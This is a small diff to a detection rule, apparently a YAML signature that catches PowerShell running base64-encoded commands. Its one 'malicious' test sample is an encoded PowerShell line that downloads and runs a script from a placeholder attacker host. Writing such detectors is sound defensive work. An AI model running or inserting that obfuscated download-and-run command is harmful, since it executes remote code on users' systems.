@@ -4,7 +4,7 @@ description: >
   Detects PowerShell executing base64-encoded commands. Strong indicator of ClickFix attacks hiding malicious payloads.
 
 pattern: |
-  (?i)powershell.*-\s*(?:e|enc|encodedcommand)(?:\^?[a-z])*?\s+[A-Za-z0-9+/]{20,}={0,2}
+  (?i)(powershell.*-\s*(?:e|enc|encodedcommand)(?:\^?[a-z])*?\s+[A-Za-z0-9+/]{20,}={0,2})
 
 malicious:
   - "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcAAuAHAAcwAxACIAKQA="
